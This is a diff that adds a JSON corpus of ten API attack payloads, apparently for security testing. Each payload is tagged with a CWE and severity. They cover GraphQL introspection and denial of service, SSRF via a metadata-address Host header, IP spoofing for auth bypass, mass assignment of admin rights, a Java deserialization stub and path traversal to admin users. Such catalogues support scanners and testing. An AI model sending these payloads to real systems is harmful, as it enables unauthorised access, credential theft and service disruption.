@@ -1,0 +1,18 @@
+{
+  "schema": "12-schemas/payload.schema.json",
+  "corpus_id": "PL-API",
+  "version": "1.0.0",
+  "provenance": { "source": "PAT", "ref": "master@2026-01-15" },
+  "payloads": [
+    { "payload_id": "PL-API-0001", "cwe_id": "CWE-749", "context": "graphql", "surface": "body", "engine": "graphql", "payload": "{ __schema { types { name } } }", "severity": "low", "tags": ["introspection"], "classification": "T0" },
+    { "payload_id": "PL-API-0002", "cwe_id": "CWE-400", "context": "graphql", "surface": "body", "engine": "graphql", "payload": "{ a b c d e f g h i j }", "severity": "medium", "tags": ["depth", "dos"], "classification": "T0" },
+    { "payload_id": "PL-API-0003", "cwe_id": "CWE-400", "context": "graphql", "surface": "body", "engine": "graphql", "payload": "{ a(alias:\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\") }", "severity": "high", "tags": ["alias-batching", "dos"], "classification": "T0" },
+    { "payload_id": "PL-API-0004", "cwe_id": "CWE-918", "context": "graphql", "surface": "body", "engine": "graphql", "payload": "query($u:String!){ user(url:$u){ id } }", "severity": "high", "tags": ["ssrf", "variable-injection"], "classification": "T1" },
+    { "payload_id": "PL-API-0005", "cwe_id": "CWE-918", "context": "rest", "surface": "header", "engine": "none", "payload": "Host: 169.254.169.254", "severity": "high", "tags": ["host-header-injection"], "classification": "T1" },
+    { "payload_id": "PL-API-0006", "cwe_id": "CWE-113", "context": "rest", "surface": "header", "engine": "none", "payload": "X-Forwarded-For: 127.0.0.1", "severity": "medium", "tags": ["ip-spoof", "auth-bypass"], "classification": "T0" },
+    { "payload_id": "PL-API-0007", "cwe_id": "CWE-436", "context": "rest", "surface": "header", "engine": "none", "payload": "Content-Type: application/xml", "severity": "medium", "tags": ["content-type-confusion"], "classification": "T0" },
+    { "payload_id": "PL-API-0008", "cwe_id": "CWE-345", "context": "rest", "surface": "body", "engine": "none", "payload": "{\"admin\":true,\"role\":\"admin\"}", "severity": "high", "tags": ["mass-assignment"], "classification": "T0" },
+    { "payload_id": "PL-API-0009", "cwe_id": "CWE-502", "context": "rest", "surface": "body", "engine": "java", "payload": "rO0ABXNyABdqYXZhLnV0aWwuSGFzaE1hcA==", "severity": "critical", "tags": ["deserialization", "ysoserial"], "classification": "T2" },
+    { "payload_id": "PL-API-0010", "cwe_id": "CWE-639", "context": "rest", "surface": "parameter", "engine": "none", "payload": "/api/v1/orders/../../admin/users", "severity": "high", "tags": ["idor", "path-traversal"], "classification": "T0" }
+  ]
+}
